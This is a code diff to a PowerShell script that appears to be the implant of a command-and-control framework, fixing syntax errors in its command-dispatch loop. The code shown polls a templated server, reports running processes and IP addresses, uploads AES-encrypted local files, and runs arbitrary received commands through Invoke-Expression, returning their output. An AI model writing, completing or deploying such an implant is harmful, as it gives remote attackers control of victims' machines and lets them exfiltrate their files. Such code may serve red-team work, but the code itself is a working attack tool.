@@ -84,7 +84,7 @@ while($true){
 
     if($fc -eq "False"){
 
-    }elseif($fc -eq "Report"){
+    } elseif($fc -eq "Report"){
       $ps = foreach ($i in Get-Process){$i.ProcessName};
       $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
       $ps+= $arr -join ";"
@@ -98,8 +98,7 @@ while($true){
       $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
       $wcrh.add("App-Logic", $he);
       $wcr.downloadString("OCU_PROTO://SRVHOST/OCT_report");
-    }
-    eseif($fc.split(" ")[0] -eq "Download")l{
+    } elseif($fc.split(" ")[0] -eq "Download"){
         $filename = EncryptAES $AES_KEY $AES_IV $fc.split("\")[-1]
         $file_content = Get-Content $fc.split(" ")[1] -Encoding byte
         #$Bytes = [System.Text.Encoding]::Unicode.GetBytes($file_content);
@@ -109,23 +108,23 @@ while($true){
         $wc3h = $wc3.Headers;
         $wc3h.add("Content-Type", "application/x-www-form-urlencoded");
         $wc3.UploadString("OCU_PROTO://SRVHOST/OCT_file_receiver", "fn=$filename&token=$efc");
-    }
-    eseif($fc.split(" ")[0] -eq "reset-ps")l{
+    } elseif($fc -eq "reset-ps"){
         try{
-        $ec = Invoke-Expression ("Remove-Variable * -ErrorAction SilentlyContinue") | Out-String;
-        $ec = "OK";
+        # Reset Powershell session (clean)
+        # NOT IMPLEMENTED YET
+        $ec = "NO";
         }
         catch{
         $ec = $Error[0] | Out-String;
         }
+
         $EncodedText = EncryptAES $AES_KEY $AES_IV $ec;
         $wc3 = New-Object system.Net.WebClient;
         $wc3.Headers["App-Logic"] = $final_hostname_encrypted;
         $wc3.Headers["Authorization"] = $EncodedText;
         $wc3.Headers["Session"] = $command_raw;
         $wc3.downloadString("OCU_PROTO://SRVHOST/OCTRECV");
-    }
-    else{
+    } else{
       try{
         $ec = Invoke-Expression ($fc) | Out-String;
         }
@@ -138,7 +137,6 @@ while($true){
         $wc3.Headers["Authorization"] = $EncodedText;
         $wc3.Headers["Session"] = $command_raw;
         $wc3.downloadString("OCU_PROTO://SRVHOST/OCTRECV");
-
     }
 
     sleep $TASK_CHECK_INTERVAL;
